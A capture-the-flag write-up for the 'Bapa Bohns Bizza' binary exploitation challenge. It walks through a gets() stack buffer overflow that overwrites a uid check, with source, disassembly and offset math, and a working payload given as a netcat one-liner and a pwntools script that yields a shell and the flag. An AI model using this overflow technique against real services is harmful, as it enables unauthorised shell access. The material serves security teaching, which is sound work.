# Bapa Bohns Bizza
* **Event:** BepisCTF (ISSS CTF 09-06-2016)
* **Problem Type:** Binary Exploitation

## Background
[Netcat](https://en.wikipedia.org/wiki/Netcat) is an invaluable tool for testing networking and connecting to servers.

[Objdump](https://linux.die.net/man/1/objdump) Allows you to dump compiled code into readable assembly

[Pwntools](https://github.com/arthaud/python3-pwntools) is very useful when exploiting more complicated services.

[GDB](http://man7.org/linux/man-pages/man1/gdb.1.html) allows you to easily debug programs and see what is happening inside them at runtime.

## Steps
### Connect to the server with netcat
```
$ nc ctf.iss.io 9001
This is the Bapa Bohns raw socket delivery service.
Only privileged users can order over TCP.
Enter your name:
huck
Warning! huck is an unprivileged user
```
This just gives us an idea of what the program does.

### Look at source :)
The source is provided for us!
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int do_auth(char * pass);
void login();
void get_flag();

int main() {
  printf("This is the Bapa Bohns raw socket delivery service.\n");
  printf("Only privileged users can order over TCP.\n");
  login();
  return 1;
}

void login() {
  int x = getuid(); // Get user id process caller

  char name[20];
  printf("Enter your name:\n");
  gets(name);

  if(x == 0) { // Check if we were called by root (user id = 0)
    printf("Access granted to %s", name);
    printf("What kind of bizza do you want.\n");
    get_flag();
  }
  else {
    printf("Warning! %s is an unprivileged user\n", name);
  }
}

void get_flag() {
  char*  args[2] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}
```
Basically we want to find some way to call `get_flag`. If we could get x=0 then we'd get the flag.
The "Enter your name" part of this code seems slightly out of place. If we read the man page for gets() it says:
```
Never use gets().  Because it is impossible to tell without knowing the data in advance  how  many  characters
       gets()  will  read, and because gets() will continue to store characters past the end of the buffer, it is ex‐
       tremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
```

If we google buffer overrun it says
```
In information security and programming, a buffer overflow, or buffer overrun,
is an anomaly where a program, while writing data to a buffer, overruns the
buffer's boundary and overwrites adjacent memory locations.
```

Cool! So maybe we can overwrite `x` by writing a long string into `name`.

### Look at assembly
```
objdump -M intel --disassemble=login pwnable
000000000040066f <login>:
  40066f:       55                      push   rbp
  400670:       48 89 e5                mov    rbp,rsp
  400673:       48 83 ec 20             sub    rsp,0x20
  400677:       e8 74 fe ff ff          call   4004f0 <getuid@plt>
  40067c:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax            @x = getuid()
  40067f:       bf 0a 08 40 00          mov    edi,0x40080a
  400684:       e8 57 fe ff ff          call   4004e0 <puts@plt>
  400689:       48 8d 45 e0             lea    rax,[rbp-0x20]                     @load name
  40068d:       48 89 c7                mov    rdi,rax
  400690:       b8 00 00 00 00          mov    eax,0x0
  400695:       e8 96 fe ff ff          call   400530 <gets@plt>                  @gets(name)
  40069a:       83 7d fc 00             cmp    DWORD PTR [rbp-0x4],0x0
  40069e:       75 2c                   jne    4006cc <login+0x5d>
  4006a0:       48 8d 45 e0             lea    rax,[rbp-0x20]
  4006a4:       48 89 c6                mov    rsi,rax
  4006a7:       bf 1b 08 40 00          mov    edi,0x40081b
  4006ac:       b8 00 00 00 00          mov    eax,0x0
  4006b1:       e8 4a fe ff ff          call   400500 <printf@plt>
  4006b6:       bf 30 08 40 00          mov    edi,0x400830
  4006bb:       e8 20 fe ff ff          call   4004e0 <puts@plt>
  4006c0:       b8 00 00 00 00          mov    eax,0x0
  4006c5:       e8 1b 00 00 00          call   4006e5 <get_flag>
  4006ca:       eb 16                   jmp    4006e2 <login+0x73>
  4006cc:       48 8d 45 e0             lea    rax,[rbp-0x20]
  4006d0:       48 89 c6                mov    rsi,rax
  4006d3:       bf 50 08 40 00          mov    edi,0x400850
  4006d8:       b8 00 00 00 00          mov    eax,0x0
  4006dd:       e8 1e fe ff ff          call   400500 <printf@plt>
  4006e2:       90                      nop
  4006e3:       c9                      leave
  4006e4:       c3                      ret
```
From the disassembly we can see both `x` and `name` are being stored on the stack.
`x` is at `rbp-0x4` and the first byte in `name` is at `rbp-0x20`
Thus if we write 0x1c bytes, the next 4 byte written will overwrite `x`.

### Write an exploit
We need to write 0x1c bytes then overwrite x with 0.
Since x is a 4 byte int we need to write 4 null characters.
```
$ python3 -c "print('a'*0x1c + '\x00'*4)" | nc ctf.isss.io
This is the Bapa Bohns raw socket delivery service.
Only privileged users can order over TCP.
Enter your name:
Access granted to aaaaaaaaaaaaaaaaaaaaaaaaaaaaWhat kind of bizza do you want.
```

In order to get the flag we need to interact with the socket after the python script finishes. We can do this with `cat -`.
```
$ (python3 -c "print('a'*0x1c + '\x00'*4)"; cat -) | nc ctf.isss.io
This is the Bapa Bohns raw socket delivery service.
Only privileged users can order over TCP.
Enter your name:
Access granted to aaaaaaaaaaaaaaaaaaaaaaaaaaaaWhat kind of bizza do you want.
ls
flag.txt
cat flag.txt
utflag{b1zza_tim3}
```

### Writing an exploit with pwntools
Pwntools is great for harder binary exploitation challenges.

```
from pwn import *

r = remote("ctf.isss.io", 9001)
r.readline()
r.sendline(b'a'*28 + p32(0))
r.interactive()
```
